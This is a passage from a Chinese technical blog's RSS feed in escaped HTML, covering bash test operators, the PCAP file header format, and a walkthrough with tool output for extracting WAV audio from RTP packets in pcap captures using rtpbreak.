&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; conditio &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; action;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;算数比较&#34;&gt;算数比较&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#当var等于0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#当var不等于0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;-gt 大于&lt;/li&gt;
&lt;li&gt;-lt 小于&lt;/li&gt;
&lt;li&gt;-ge 大于或等于&lt;/li&gt;
&lt;li&gt;-le 小于或等于&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用-a, -o 可以组合复杂的测试。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -a $var -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# -a相当于并且&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -o $var -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# -o相当于或&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;文件比较&#34;&gt;文件比较&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -f $file &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 如果file是存在的文件路径或者文件名，则返回真&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;-f 测试文件路径或者文件是否存在&lt;/li&gt;
&lt;li&gt;-x 测试文件是否可执行&lt;/li&gt;
&lt;li&gt;-e 测试文件是否存在&lt;/li&gt;
&lt;li&gt;-c 测试文件是否是字符设备&lt;/li&gt;
&lt;li&gt;-b 测试文件是否是块设备&lt;/li&gt;
&lt;li&gt;-w 测试文件是否可写&lt;/li&gt;
&lt;li&gt;-r 测试文件是否可读&lt;/li&gt;
&lt;li&gt;-L 测试文件是否是一个符号链接&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;字符串比较&#34;&gt;字符串比较&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;字符串比较一定要用双中括号。&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>xmpp学习</title>
      <link>https://wdd.js.org/posts/2020/05/db6ou6/</link>
      <pubDate>Fri, 08 May 2020 11:09:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/db6ou6/</guid>
      <description></description>
    </item>
    <item>
      <title>网络拆包笔记</title>
      <link>https://wdd.js.org/network/gzskun/</link>
      <pubDate>Sun, 03 May 2020 10:59:10 +0800</pubDate>
      <guid>https://wdd.js.org/network/gzskun/</guid>
      <description>&lt;h1 id=&#34;介绍&#34;&gt;介绍&lt;/h1&gt;
&lt;p&gt;之所以要写这篇文章，是因为我要从pcap格式的抓包文件中抽取出语音文件。之间虽然对tcp协议有不错的理解，但并没有写代码去真正的解包分析。&lt;/p&gt;
&lt;p&gt;最近用Node.js尝试去pacp文件中成功提取出了语音文件。再次做个总结。&lt;/p&gt;
&lt;h1 id=&#34;预备知识&#34;&gt;预备知识&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;字节序： 关于字节序，可以参考 &lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/11/byte-order.html&#34;&gt;https://www.ruanyifeng.com/blog/2016/11/byte-order.html&lt;/a&gt;。读取的时候，如果字节序设置错了，就会读出来一堆无法解析的内容&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;pcap格式&#34;&gt;PCAP格式&lt;/h1&gt;
&lt;p&gt;下面是paap文件的格式。&lt;/p&gt;
&lt;p&gt;开局是一个全局的头文件。后续跟着一系列的包头和包体。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/gzskun/2022-10-29-18-31-05.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;global-header格式&#34;&gt;Global Header格式&lt;/h2&gt;
&lt;p&gt;全局头由六个字段组成，加起来一共24个字节。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; pcap_hdr_s {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        guint32 magic_number;   &lt;span style=&#34;color:#75715e&#34;&gt;/* magic number */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        guint16 version_major;  &lt;span style=&#34;color:#75715e&#34;&gt;/* major version number */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        guint16 version_minor;  &lt;span style=&#34;color:#75715e&#34;&gt;/* minor version number */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        gint32  thiszone;       &lt;span style=&#34;color:#75715e&#34;&gt;/* GMT to local correction */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        guint32 sigfigs;        &lt;span style=&#34;color:#75715e&#34;&gt;/* accuracy of timestamps */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        guint32 snaplen;        &lt;span style=&#34;color:#75715e&#34;&gt;/* max length of captured packets, in octets */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        guint32 network;        &lt;span style=&#34;color:#75715e&#34;&gt;/* data link type */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;pcap_hdr_t&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;magic_number 魔术字符，32位无符号整型，一般是0xa1b2c3d4或者0xd4c3b2a1，前者表示字段要按照大端字节序来读取，后者表示字段要按照小段字节序来读取。&lt;/li&gt;
&lt;li&gt;version_major 大版本号，16位无符号整形。一般是2&lt;/li&gt;
&lt;li&gt;version_minor 小版本号，16位无符号整形。一般是4&lt;/li&gt;
&lt;li&gt;thiszone 时区&lt;/li&gt;
&lt;li&gt;sigfigs 实际时间戳&lt;/li&gt;
&lt;li&gt;snaplen 捕获的最大的长度&lt;/li&gt;
&lt;li&gt;network 数据链路层的类型。参考&lt;a href=&#34;http://www.tcpdump.org/linktypes.html&#34;&gt;http://www.tcpdump.org/linktypes.html&lt;/a&gt;， 常见的1就是表示IEEE 802.3&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;packet-header&#34;&gt;Packet Header&lt;/h2&gt;
&lt;p&gt;当读取了pcap文件的前24个字节之后，紧接着需要读取16个字节。这16个字节中，incl_len表示packet数据部分的长度。当拿到了Packet Data部分数据的长度。我们同时也就知道了下一个packet header要从哪个位置开始读取。&lt;/p&gt;</description>
    </item>
    <item>
      <title>从pcap文件提取转wav语音文件</title>
      <link>https://wdd.js.org/posts/2020/05/fosfbg/</link>
      <pubDate>Fri, 01 May 2020 09:36:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/fosfbg/</guid>
      <description>&lt;p&gt;wireshark具有这个功能，但是并不适合做批量执行。&lt;/p&gt;
&lt;p&gt;下面的方案比较适合批量执行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 1. 安装依赖
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;yum install gcc libpcap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;devel libnet&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;devel sox &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 2. 克隆源码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;git clone https:&lt;span style=&#34;color:#75715e&#34;&gt;//github.com/wangduanduan/rtpsplit.git
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 3. 切换目录
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cd rtpsplit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 4. 编译可执行文件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;make
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 5. 将可执行文件复制到/usr/local/bin目录下
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp src&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;rtpbreak &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 6. 切换到录音文件的目录，假如当前目录只有一个文件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;rtpbreak &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r krk9hprvin1u1laqe14g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;beffe8aaeb9bf99.pcap &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;g &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;d .&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  audio git:(edge) &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;✗&lt;/span&gt; rtpbreak &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r krk9hprvin1u1laqe14g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;beffe8aaeb9bf99.pcap &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;g &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;d .&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rtpbreak v1&lt;span style=&#34;color:#ae81ff&#34;&gt;.3&lt;/span&gt;a running here&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pid: &lt;span style=&#34;color:#ae81ff&#34;&gt;1885&lt;/span&gt;, date&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;time: &lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;05&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;09&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;05&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; Configuration
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; INPUT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Packet source: rxfile &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;krk9hprvin1u1laqe14g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;beffe8aaeb9bf99.pcap&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Force datalink header length: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; OUTPUT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Output directory: &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     RTP raw dumps: enabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     RTP pcap dumps: enabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Fill gaps: enabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Dump noise: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Logfile: &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;.&lt;span style=&#34;color:#75715e&#34;&gt;//rtp.0.txt&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;     Logging to stdout: enabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Logging to syslog: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Be verbose: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; SELECT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Sniff packets in promisc mode: enabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Add pcap filter: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Expecting even destination UDP port: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Expecting unprivileged source&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;destination UDP ports: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Expecting RTP payload type: any
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Expecting RTP payload length: any
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Packet timeout: &lt;span style=&#34;color:#ae81ff&#34;&gt;10.00&lt;/span&gt; seconds
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Pattern timeout: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.25&lt;/span&gt; seconds
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Pattern packets: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EXECUTION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Running as user&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;group: root&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;root
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Running daemonized: disabled
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; You can dump stats sending me a SIGUSR2 signal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; Reading packets...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open di .&lt;span style=&#34;color:#75715e&#34;&gt;//rtp.0.0.txt
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt; [rtp0] detected: pt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;(g711U) &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.40.192&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26396&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.60.229&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open di .&lt;span style=&#34;color:#75715e&#34;&gt;//rtp.0.1.txt
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt; [rtp1] detected: pt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;(g711U) &lt;span style=&#34;color:#ae81ff&#34;&gt;10.197.169.10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49265&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.60.229&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20012&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; eof reached.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Caught SIGTERM &lt;span style=&#34;color:#a6e22e&#34;&gt;signal&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;), cleaning up...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; [rtp1] closed: packets inbuffer&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; flushed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;285&lt;/span&gt; lost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.00&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;), call_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;m12s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; [rtp0] closed: packets inbuffer&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; flushed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;586&lt;/span&gt; lost&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.00&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;), call_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;m12s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; Status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Alive RTP Sessions: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Closed RTP Sessions: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Detected RTP Sessions: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Flushed RTP packets: &lt;span style=&#34;color:#ae81ff&#34;&gt;871&lt;/span&gt;
